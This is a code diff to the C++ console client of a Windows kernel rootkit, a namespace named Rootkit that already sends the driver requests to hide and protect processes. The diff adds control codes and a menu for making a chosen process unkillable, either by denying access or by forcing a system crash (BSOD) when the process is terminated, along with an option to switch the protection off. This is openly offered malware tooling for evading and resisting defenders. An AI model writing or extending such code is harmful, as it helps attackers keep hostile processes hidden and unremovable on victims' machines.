@@ -1,4 +1,5 @@
 #include <iostream>
+#include <string>
 #include <Windows.h>
 
 namespace Rootkit {
@@ -12,6 +13,10 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG ProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectProcessNotTerminate =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG DisableProtectProcessNotTerminate =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -84,6 +89,34 @@ namespace Rootkit {
             nullptr
         );
     }
+
+    bool ProtectProcessNotTerminate(HANDLE driver_handle, DWORD pid) {
+        // Use struct
+        Request r;
+        r.process_id = ULongToHandle(pid);
+        return DeviceIoControl(
+            driver_handle,
+            codes::ProtectProcessNotTerminate,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
+    }
+    bool DisableProtectProcessNotTerminate(HANDLE driver_handle) {
+        return DeviceIoControl(
+            driver_handle,
+            codes::DisableProtectProcessNotTerminate,
+            nullptr,
+            0,
+            nullptr,
+            0,
+            nullptr,
+            nullptr
+        );
+    }
 }
 
 void showMenu() {
@@ -130,10 +163,12 @@ int main() {
     std::cout << "Got a driver handle!\n";
 
     int choice;
+    int protectChoice;
+    int protectPid = 0;
 
     while (true) {
         showMenu();
-
+        bool hasProtected = false;
         std::cin >> choice;
 
         switch (choice) {
@@ -157,11 +192,42 @@ int main() {
             Rootkit::HideProcess(driver_handle, pidHide);
             break;
         case 4:
-            int pidProtect;
-            std::cout << "Enter a PID: ";
-            std::cin >> pidProtect;
-            std::cout << "[!] Sending Message to Driver.\n";
-            Rootkit::ProtectProcess(driver_handle, pidProtect);
+            system("cls");
+            std::cout << "============\n";
+            std::cout << "Process Protection Menu\n";
+            std::cout << "1. Protect without termination\n";
+            std::cout << "2. Protect with termination\n";
+            if (hasProtected) {
+                std::string str = std::to_string(protectPid);
+                std::cout << "3. Disable protecting process with PID" << str << std::endl;
+            }
+            std::cout << "\nExplanation: Protecting with termination means that when process is terminated, system crashes (BSOD), without termination means that Access Is Denied message will appear.\n";
+            std::cout << "\nEnter a choice: ";
+            std::cin >> protectChoice;
+            if (protectChoice == 2) {
+                std::cout << "\nEnter a PID: ";
+                std::cin >> protectPid;
+                std::cout << "\n[!] Sending Message to Driver.\n";
+                Rootkit::ProtectProcess(driver_handle, protectPid);
+                break;
+            }
+            if (protectChoice == 1) {
+                std::cout << "\nEnter a PID: ";
+                std::cin >> protectPid;
+                std::cout << "\n[!] Sending Message to Driver.\n";
+                Rootkit::ProtectProcessNotTerminate(driver_handle, protectPid);
+                break;
+            }
+            if (protectChoice == 3) {
+                std::cout << "[!] Sending Message to Driver (disabling protection of PID)\n";
+                Rootkit::DisableProtectProcessNotTerminate(driver_handle);
+                break;
+            }
+            else {
+                std::cout << "Please enter a valid choice...\n";
+                Sleep(5000);
+                break;
+            }
         case 99:
             std::cout << "Exiting the program, bye!\n";
             break;
